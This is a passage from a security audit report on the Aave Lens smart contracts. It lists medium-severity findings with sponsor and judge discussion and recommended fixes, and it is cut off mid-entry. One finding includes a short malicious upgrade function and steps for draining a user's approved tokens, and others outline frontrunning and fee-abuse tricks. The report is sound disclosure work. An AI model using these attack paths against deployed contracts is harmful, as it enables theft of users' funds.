[FeeCollectModule.sol#L72](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L72)<br>\n\nLimitedFeeCollectModule: [LimitedFeeCollectModule.sol#L79](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L79)<br>\n\nTimedFeeCollectModule: [TimedFeeCollectModule.sol#L81](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L81)<br>\n\nLimitedTimedFeeCollectModule: [LimitedTimedFeeCollectModule.sol#L86](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L86)<br>\n\nFeeFollowModule also uses the same approach: [FeeFollowModule.sol#L62](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L62)<br>\n\n### Recommended Mitigation Steps\n\nAs a simplest solution consider adding a separate constant for minimum fee amount in nominal terms, say 1 or 10.\n\n**[Zer0dot (Aave Lens) confirmed, resolved, and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46#issuecomment-1074504184):**\n > Addressed in [aave/lens-protocol#74](https://github.com/aave/lens-protocol/pull/74)\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46#issuecomment-1116634368):**\n > Good find! The warden has identified that the use of `BPS_MAX` is too restrictive to handle tokens with small decimals.\n\n\n\n***\n\n## [[M-02] Inappropriate handling of `referralFee` makes collecting Mirror fails without error when `referrerProfileId` is burned](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/67)\n_Submitted by WatchPug, also found by cccz_\n\nIn the current implementation, even when the profile's owner burnt the `ProfileNFT`, as the profile's legacy, the publications can still be collected.\n\nHowever, if the publication is a `Mirror` and there is a `referralFee` set by the original publication, the user won't be able to collect from a `Mirror` that was published by a burned profile.\n\n[FeeCollectModule.sol#L163-L172](https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/FeeCollectModule.sol#L163-L172)<br>\n\n```solidity\nif (referralFee != 0) {\n    // The reason we levy the referral fee on the adjusted amount is so that referral fees\n    // don't bypass the treasury fee, in essence referrals pay their fair share to the treasury.\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount - referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n}\n```\n\n> When a mirror is collected, what happens behind the scenes is the original, mirrored publication is collected, and the mirror publisher's profile ID is passed as a \"referrer.\"\n\nIn `_processCollectWithReferral()`, if there is a `referralFee`, contract will read `referralRecipient` from `IERC721(HUB).ownerOf(referrerProfileId)`, if `referrerProfileId` is burned, the `IERC721(HUB).ownerOf(referrerProfileId)` will revert with `ERC721: owner query for nonexistent token`.\n\nHowever, since we wish to allow the content to be collected, we should just treat referrals as non-existent in this situation.\n\n### Recommended Mitigation Steps\n\nChange to:\n\n```solidity\ntry IERC721(HUB).ownerOf(referrerProfileId) returns (address referralRecipient) {\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount - referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n} catch {\n    emit LogNonExistingReferrer(referrerProfileId);\n}\n```\n\n**[Zer0dot (Aave Lens) acknowledged and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/67#issuecomment-1074520332):**\n > This is valid! However, this is only an issue when a profile is deleted (burned), in which case UIs have multiple choices:\n> \n>     1. Stop displaying all the burnt profile's publications\n>     2. Redirect users, when collecting mirrors, to the original publication\n>     3. Prevent all collects\n> \n> I don't think this adds any risk to the protocol and although it's valid, we will not be taking any action.\n\n\n\n***\n\n## [[M-03] Profile creation can be frontrun](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26)\n_Submitted by cmichel_\n\n[PublishingLogic.sol#L50](https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/libraries/PublishingLogic.sol#L50)<br>\n\nThe `LensHub/PublishingLogic.createProfile` function can be frontrun by other whitelisted profile creators.<br>\nAn attacker can observe pending `createProfile` transactions and frontrun them, own that handle, and demand ransom from the original transaction creator.\n\n### Recommended Mitigation Steps\n\nEveryone needs to use flashbots / private transactions but it might not be available on the deployed chain.<br>\nA commit/reveal scheme for the handle and the entire profile creation could mitigate this issue.\n\n**[donosonaumczuk (Aave Lens) disputed](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26)**\n\n**[oneski (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1042222585):**\n > Declined. This is by design. Governance can allow contracts/addresses to mint. If governance allows a malicious actor that is the fault of governance. Governance can also allow contracts that implement auction/commit reveal or other functionality as well to manage the profile minting system.\n> \n> The protocol should take no opinion on this by default.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1117272513):**\n > While I agree that this is the fault of the governance, I think it still stands that any whitelisted user may be compromised or become malicious at a later point in time. For that reason, I think this issue has some validity although due to the unlikely nature (requiring a faulty governance), I'll mark this as `medium` risk for now.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125573841):**\n > I disagree on the medium risk. Governance being faulty is not enough of a reason IMO. Like most governance-included protocols, governance getting compromised bears risks that are largely unavoidable.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125814379):**\n > While I agree that a faulty governance is an extremely unlikely outcome. It isn't stated in the README and as per the judges' guidelines, profiles can be front-run under specific stated assumptions/external requirements. A malicious whitelisted profile creator can reasonably front-run other creators. \n> \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n**[Zer0dot (Aave Lens) acknowledged and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1126095390):**\n > Fair enough, though we were aware of this-- it's clear it falls into a medium severity. We're acknowledging this!\n\n\n\n***\n\n## [[M-04] Name squatting](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27)\n_Submitted by cmichel_\n\n[LensHub.sol#L142](https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/LensHub.sol#L142)<br>\n\nCreating profiles through `LensHub/PublishingLogic.createProfile` does not cost anything and will therefore result in \"name squatting\".<br>\nA whitelisted profile creator will create many handles that are in demand, even if they don't need them, just to flip them for a profit later.<br>\nThis ruins the experience for many high-profile users that can't get their desired handle.\n\n### Recommended Mitigation Steps\n\nConsider auctioning off handles to the highest bidder or at least taking a fee such that the cost of name squatting is not zero.\n\n**[donosonaumczuk (Aave Lens) disputed](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27)**\n\n**[oneski (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27#issuecomment-1042215123):**\n > Declined. This is by design. Governance can allow contracts/addresses to mint. If governance allows a malicious actor that is the fault of governance. Governance can also allow contracts that implement auction or other functionality as well to manage the profile minting system.\n> \n> The protocol should take no opinion on this by default.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27#issuecomment-1117274439):**\n > I will mark this as `medium` risk for the same reasons outlined in [M-03 (Issue #26)](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125814379).\n\n\n\n***\n\n## [[M-05] Cashback on referral](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20)\n_Submitted by cmichel, also found by csanuragjain and gzeon_\n\n[FeeCollectModule.sol#L99](https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/modules/collect/FeeCollectModule.sol#L99)<br>\n\nIn the fee collect modules like `FeeCollectModule` there is no prevention of someone submitting a second profile they own as the `referrerProfileId` in `processCollect` to receive back part of the fees paid.\n\nThe referral system is essentially broken as all rational agents will submit a second profile they control to get back part of the fees.\nOne could even create a referrer smart contract profile that anyone can submit which automatically refunds the fee received.\nA [similar royalties/referral fees issue](https://github.com/code-423n4/2021-11-nested-findings/issues/30) was judged high-severity recently.\n\n### Recommended Mitigation Steps\n\nThere's no way to avoid this except by not allowing any profile as a referrer.<br>\nWhitelist certain important infrastructure providers, like different frontends, as referrers and only allow these to be used instead of users submitting their alt profiles.\n\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1039791848):**\n > Not sure if this makes sense, using your own referrer as a profile would basically be the equivalent of just having your publication collected directly without referral. In which case, what is the vulnerability?\n\n**[donosonaumczuk (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1074354753):**\n > I think they mean the case where Alice posts something and Bob wants to collect it. So Bob instead of just collecting directly from Alice publication, he creates a secondary profile, Bob2, mirrors publication through Bob2 and now Bob collects through Bob2's mirror, basically using the referral fee as a collecting discount for himself.\n> \n> Even if we enforce referral profile owner to be different than collecting profile owner (aka comparing `ownerOf(profileId)` instead of `profileId`) people can just use different addresses for the purpose.\n> \n> I saw this before but I assumed most of people will use the frontend, which will handle this automatically. But I believe that in the long term is possible that people learn the trick and, as rational agents, use it. \n> \n> Awaiting for @Zer0dot thoughts on this.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1074492445):**\n > I see, thanks @donosonaumczuk, at the end of the day this is a social protocol. Just like how on legacy social media, users can spam/abuse things, it's a given here that we will never have a fully foolproof system. Plus, with the chain history being visible, tools can (and I'd like to see them) be built to filter out nasty behavior. @oneski want to weigh in?\n\n**[donosonaumczuk (Aave Lens) disputed and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1079127042):**\n > I think there is nothing more to do here.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1117647633):**\n > I think its naive to think that this will be properly handled by the front-end and won't be abused by users at some point in time. As such, I'm inclined to treat this as a valid `medium` risk issue because it fits the category of value leakage by the protocol. However, I can understand that there is no easy fix to this because it is impossible to link EOAs as originating from the same person.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1125239400):**\n > Yeah I think that's fair, since we're dealing with a social protocol there's a degree of social \"etiquette\" expected from users. Since this does not harm the protocol or the original publication creator, I don't see it as a significant flaw. However, it does of course harm curators. I tend to disagree on the point about frontends @0xleastwood though, it seems to me that if this were to be a problem, it would be fairly straightforward to point fingers at those abusing the system.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1125801258):**\n > While I understand an attacker would need to call functions directly to set this up, I'm not fully onboard with the idea that we could punish users who abuse the system in such a way. As per the judging guidelines, any issue that leaks value from the protocol is `medium` risk.\n> \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> I think its perfectly fine if this issue is acknowledged and you guys have decided to handle it through front-end design. However, it does not take away from the fact that it is still somewhat of an exploit.\n\n**[Zer0dot (Aave Lens) acknowledged and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1126093212):**\n > Fair enough! We can roll with medium.\n\n\n\n***\n\n## [[M-06] Imprecise management of users' allowance allows the admin of the upgradeable proxy contract to rug users](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68)\n_Submitted by WatchPug_\n\nIn the current implementation, when there is a fee on follow or collect, users need to approve to the follow modules or collect module contract, and then the `Hub` contract can call `processFollow()` and transfer funds from an arbitrary address (as the `follower` parameter).\n\n[FeeFollowModule.sol#L75-L91](https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FeeFollowModule.sol#L75-L91)<br>\n\n```solidity\nfunction processFollow(\n    address follower,\n    uint256 profileId,\n    bytes calldata data\n) external override onlyHub {\n    uint256 amount = _dataByProfile[profileId].amount;\n    address currency = _dataByProfile[profileId].currency;\n    _validateDataIsExpected(data, currency, amount);\n\n    (address treasury, uint16 treasuryFee) = _treasuryData();\n    address recipient = _dataByProfile[profileId].recipient;\n    uint256 treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n    uint256 adjustedAmount = amount - treasuryAmount;\n\n    IERC20(currency).safeTransferFrom(follower, recipient, adjustedAmount);\n    IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n}\n```\n\nA common practice is asking users to approve an unlimited amount to the contracts. Normally, the `allowance` can only be used by the user who initiated the transaction.\n\nIt's not a problem as long as `transferFrom` will always only transfer funds from `msg.sender` and the contract is non-upgradable.\n\nHowever, the `LensHub` contract is upgradeable, and `FeeFollowModule` will `transferFrom` an address decided by an input parameter `follower`, use of upgradeable proxy contract structure allows the logic of the contract to be arbitrarily changed.\n\nThis allows the proxy admin to perform many malicious actions, including taking funds from users' wallets up to the allowance limit.\n\nThis action can be performed by the malicious/compromised proxy admin without any restriction.\n\n### Proof of Concept\n\nGiven:\n\n*   profileId `1` uses `FeeCollectModule` with `currency` = `WETH` and `amount` = `1e18`\n*   Alice is rich (with 1,000,000 WETH in wallet balance)\n\n1.  Alice `approve()` `type(uint256).max` to `FeeCollectModule` and `follow()` profileId `1` with `1e18 WETH`;\n2.  A malicious/compromised proxy admin can call `upgradeToAndCall()` on the proxy contract and set a malicious contract as `newImplementation`, adding a new functions:\n\n```solidity\nfunction rugFollow(address follower, address followModule, uint256 profileId, bytes calldata data)\n    external\n{\n    IFollowModule(followModule).processFollow(\n        follower,\n        profileIds,\n        data\n    );\n}\n```\n\n3.  The attacker creates a new profile with `FeeCollectModule` and set `currency` = `WETH` and `amount` = `1,000,000`, got profileId = `2`\n4.  The attacker `rugFollow()` with `follower` = `Alice`, profileId = `2`, stolen `1,000,000` WETH from Alice's wallet\n\n### Recommended Mitigation Steps\n\nImproper management of users' `allowance` is the root cause of some of the biggest attacks in the history of DeFi security. We believe there are 2 rules that should be followed:\n\n1.  the `from` of `transferFrom` should always be `msg.sender`;\n2.  the contracts that hold users' `allowance` should always be non-upgradable.\n\nWe suggest adding a non-upgradeable contract for processing user payments:\n\n```solidity\nfunction followWithFee(uint256 profileId, bytes calldata data)\n    external\n{\n    (address currency, uint256 amount) = abi.decode(data, (address, uint256));\n    IERC20(currency).transferFrom(msg.sender, HUB, amount);\n\n    uint256[] memory profileIds = new uint256[](1);\n    profileIds[0] = profileId;\n\n    bytes[] memory datas = new bytes[](1);\n    datas[0] = data;\n\n    IHUB(HUB).follow(profileIds, datas);\n}\n```\n\nThis comes with an additional benefit: users only need to approve one contract instead of approving multiple `follow` or `collect` module contracts.\n\n**[Zer0dot (Aave Lens) acknowledged, but disagreed with High severity and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1072751986):**\n > This is true, but is within the acceptable risk model. \n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1117928564):**\n > While I agree with the warden, this assumes that the admin acts maliciously. As such, I think `medium` risk is more in line with a faulty governance.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1125575438):**\n > I still relatively disagree with severity, as with [M-03 (Issue #26)](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26) faulty governance is an acceptable risk parameter. Though we should have been more clear that this is the case! \n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1125811742):**\n > I agree with you fully here, but again it comes down to the judging guidelines which might change in the future. The stated attack vector has stated assumptions which leads to a loss of funds.\n> \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n***\n\n## [[M-07] It's possible to follow deleted profiles](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70)\n_Submitted by danb_\n\n[InteractionLogic.sol#L49](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/InteractionLogic.sol#L49)<br>\n\nWhen someone tries to follow a profile, it checks if the handle exists, and if it doesn't, it reverts because the profile is deleted.\nThe problem is that there might be a new profile with the same handle as the deleted one, allowing following deleted profiles.\n\n### Proof of Concept\n\nAlice creates a profile with the handle \"alice.\" The profile id is 1.<br>\nShe deleted the profile.<br>\nShe opens a new profile with the handle \"alice\". The new profile id is 2.<br>\nBob tries to follow the deleted profile (id is 1).<br>\nThe check<br>\n\n    if (_profileIdByHandleHash[keccak256(bytes(handle))] == 0)\n    \trevert Errors.TokenDoesNotExist();\n\ndoesn't revert because there exists a profile with the handle \"alice\".<br>\nTherefore Bob followed a deleted profile when he meant to follow the new profile.\n\n### Recommended Mitigation Steps\n\nChange to:\n\n    if (_profileIdByHandleHash[keccak256(bytes(handle))] != profileIds[i])\n    \trevert Errors.TokenDoesNotExist();\n\n**[Zer0dot (Aave Lens) confirmed and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1072661676):**\n > Will be changed to use the new `exists()` terminology. Valid!\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1072741927):**\n > Correction, we won't be using `exists()` to prevent extra calls, adding this comment!\n\n**[Zer0dot (Aave Lens) resolved and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1072745226):**\n > Resolved in [aave/lens-protocol#69](https://github.com/aave/lens-protocol/pull/69).\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1117941336):**\n > Nice find!\n\n\n\n***\n\n## [[M-08] Missing whenNotPaused](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/71)\n_Submitted by danb_\n\n[LensHub.sol#L929](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L929)<br>\n\nAll the external function of LensHub have whenNotPasued modifier.<br>\nHowever, LensHub is erc721 and the transfer function doesn't have the whenNotPaused modifier.\n\n### Impact\n\nIn case where the governance wants to stop all activity, they still can't stop transferring profiles nfts.<br>\nAn example where stopping transferring tokens was actually very helpful:\n<https://mobile.twitter.com/flashfish0x/status/1466369783016869892>.\n\n### Recommended Mitigation Steps\n\nAdd whenNotPasued to `_beforeTokenTransfer`.\n\n**[Zer0dot (Aave Lens) confirmed, resolved, and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/71#issuecomment-1075326629):**\n > Nice! Addressed in [aave/lens-protocol#75](https://github.com/aave/lens-protocol/pull/75).\n\n\n\n***\n\n## [[M-09] Collect modules can fail on zero amount transfers if treasury fee is set to zero](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62)\n_Submitted by hyh_\n\nTreasury fee can be zero, while collect modules do attempt to send it in such a case anyway as there is no check in place. Some ERC20 tokens do not allow zero value transfers, reverting such attempts.\n\nThis way, a combination of zero treasury fee and such a token set as a collect fee currency will revert any collect operations, rendering collect functionality unavailable\n\n### Proof of Concept\n\nTreasury fee can be set to zero:\n\n[ModuleGlobals.sol#L109](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L109)<br>\n\nTreasury fee transfer attempts are now done uncoditionally in all the collect modules.\n\nNamely, FeeCollectModule, LimitedFeeCollectModule, TimedFeeCollectModule and LimitedTimedFeeCollectModule do not check the treasury fee to be send, `treasuryAmount`, before transferring:\n\n[FeeCollectModule.sol#L176](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L176)<br>\n\n[LimitedFeeCollectModule.sol#L194](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L194)<br>\n\n[TimedFeeCollectModule.sol#L190](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L190)<br>\n\n[LimitedTimedFeeCollectModule.sol#L205](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L205)<br>\n\nThe same happens in the FeeFollowModule:\n\n[FeeFollowModule.sol#L90](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L90)\n\n### References\n\nSome ERC20 tokens revert on zero value transfers:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\n### Recommended Mitigation Steps\n\nConsider checking the treasury fee amount and do transfer only when it is positive.\n\nNow:\n\n    IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n\nTo be:\n\n    if (treasuryAmount > 0)\n    \tIERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n\n**[donosonaumczuk (Aave Lens) confirmed and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075347095):**\n > This one makes sense to me.\n> cc: @Zer0dot \n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075414219):**\n > I think it makes sense, will add!\n\n**[Zer0dot (Aave Lens) resolved and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075438824):**\n > Addressed in [aave/lens-protocol#77](https://github.com/aave/lens-protocol/pull/77).\n\n\n\n***\n\n## [[M-10] Zero collection module can be whitelisted and set to a post, which will then revert all collects and mirrors with `PublicationDoesNotExist](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86)\n_Submitted by hyh_\n\nIn case when zero collection module be white listed and then zero collection module set to a post (done by different actors), its functionality will be partially broken: every collecting and mirroring of it will be reverted with Errors.PublicationDoesNotExist, while getPubType will return its type as a Mirror.\n\nSetting severity to Medium per 'function of the protocol or its availability could be impacted', as either the behavior of rejecting collects/mirrors is desired and to be implemented explicitly, or such a scenario shouldn't exist in a system, i.e. now zero address absence in white list cannot be guaranteed as its setting is manual and possible\n\n### Proof of Concept\n\nCollect module isn't checked additionally on init, any white listed address can be set:\n\n[PublishingLogic.sol#L308-309](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/PublishingLogic.sol#L308-309)<br>\n\nWhile zero address also can be white listed:\n\n[LensHub.sol#L128-135](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L128-135)<br>\n\nIf zero address is white listed and then set as collectModule for a post, a getPointedIfMirror helper function called on it will revert with Errors.PublicationDoesNotExist:\n\n[Helpers.sol#L47](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/Helpers.sol#L47)<br>\n\nThis way all attempts to collect and mirror this post will also revert:\n\n[InteractionLogic.sol#L108](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/InteractionLogic.sol#L108)<br>\n\n[PublishingLogic.sol#L258](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/PublishingLogic.sol#L258)<br>\n\nAlso, getContentURI view will fail with the same error:\n\n[LensHub.sol#L785](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L785)<br>\n\nAnd getPubType will return Mirror as a publication type:\n\n[LensHub.sol#L829](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L829)<br>\n\n### Recommended Mitigation Steps\n\nConsider prohibiting zero collection module to be white listed.\n\nIf rejecting collects/mirrors is desired for a special post type, the corresponding error path can be implemented\n\n**[Zer0dot (Aave Lens) acknowledged and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1072618239):**\n > This implies governance is a bad actor, and despite it being a side effect, reverting on a zero collect module is acceptable. IMO this is not relevant, though technically the report is valid, we won't be changing anything.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1125580607):**\n > In consistency with some other comments I made, I wonder if marking this as \"low\" severity makes more sense. Governance being compromised is within acceptable risk parameters.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1126130415):**\n > I think this is inline with C4's guidelines for a `medium` severity issue. As such, I'd keep this as is.\n>\n > This is consistent with other governance related issues.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1126131825):**\n > Sounds fair!\n\n\n\n***\n\n## [[M-11] Approvals not cleared when transferring profile](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22)\n_Submitted by cmichel_\n\n[ApprovalFollowModule.sol#L32](https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/modules/follow/ApprovalFollowModule.sol#L32)<br>\n\nThe `ApprovalFollowModule.approve` function is indexed by both (`owner = IERC721(HUB).ownerOf(profileId)`, `profileId`) in case the profileId NFT is transferred.<br>\nHowever, upon transfer, the old approvals are not cleared.\n\nThis can lead to similar issues as OpenSea not cancelling their sale offers upon NFT transfer.<br>\nWhen the NFT is at some point transferred back to the original owner, all the old approvals are still intact which might not be expected by the owner.\n\n### Recommended Mitigation Steps\n\nConsider resetting all approvals upon transfer.\n\n**[Zer0dot (Aave Lens) disputed and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1039792144):**\n > This is known and acceptable, users should be able to check their approvals even if they don't have the profile.\n>\n > Paging @oneski if you have any input.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1118551248):**\n > I think this issue is entirely valid, it should not be on the users to manage their approvals so much. It would be much safer to wipe approvals on transfers and avoid this issue altogether.\n>\n > Keeping this issue open and as is.\n\n**[donosonaumczuk (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125224994):**\n > I would say wiping on transfers is a bit annoying as I could be transferring my profile between two addresses I own. It would be a better alternative to wipe on re-initialization by passing a boolean `keepPreviousState` flag (or something similar).\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125580300):**\n > So after some more discussion, I think the points here are valid, but we were aware of this from the beginning. There are pros and cons to maintaining state. This module will not be present at launch and further iteration can modify it. Unfortunately there is no profile NFT transfer hook in follow modules currently. As this is still in my eyes not a direct vulnerability but more a caveat of how this specific system is designed, I would no longer dispute it but I would mark it as a low severity issue.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125798004):**\n > While I agree with you that giving users the ability to save the previous state on transfer makes sense and understand that the necessary changes to do this can be put in place in the future. I think its best I stay consistent with the judging rulebook as per below:<br>\n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> I believe the functionality of the protocol is impacted in this scenario so I think its fair to keep this as `medium` risk.\n\n**[Zer0dot (Aave Lens) acknowledged and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1126098865):**\n > Sounds fair, acknowledging. This is something we're going to look into deeper for newer or updated functionality (we won't be deploying this module yet).\n\n\n\n***\n\n## [[M-12] Ineffective Whitelist](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30)\n_Submitted by cmichel_\n\n[LensHub.sol#L146](https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/LensHub.sol#L146)<br>\n\nCreating profiles through `LensHub.createProfile` requires the caller to be whitelisted.\n\n```solidity\nfunction _validateCallerIsWhitelistedProfileCreator() internal view {\n    if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n}\n```\n\nHowever, a single whitelisted account can create as many profiles as they want and send the profile NFT to other users.<br>\nThey can create unlimited profiles on behalf of other users which makes the whitelist not effective.\n\n### Recommended Mitigation Steps\n\nConsider limiting the number of profile creations per whitelisted user or severely limiting who is allowed to create profiles, basically making profile creation a centralized system.\n\n**[oneski (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1042138981):**\n > Declined, this is by design.\n> \n> Governance will decide what contracts are allowed to mint via the allowlist. If governance wishes to have a more centralized system, it will only approve contracts that have numerical caps within their code.\n\n**[Zer0dot (Aave Lens) disputed](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30)**\n\n**[0xleastwood (judge) marked invalid and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1118548551):**\n > I agree with the sponsor, I think this can already be handled by the governance strictly approving contracts with numerical caps or limiting the allowlist of who can create a profile. As such, I'm inclined to mark this as `invalid` because the recommendation can already be implemented or adhered to by the governance.\n\n**[0xleastwood (judge) re-assessed as Medium severity and 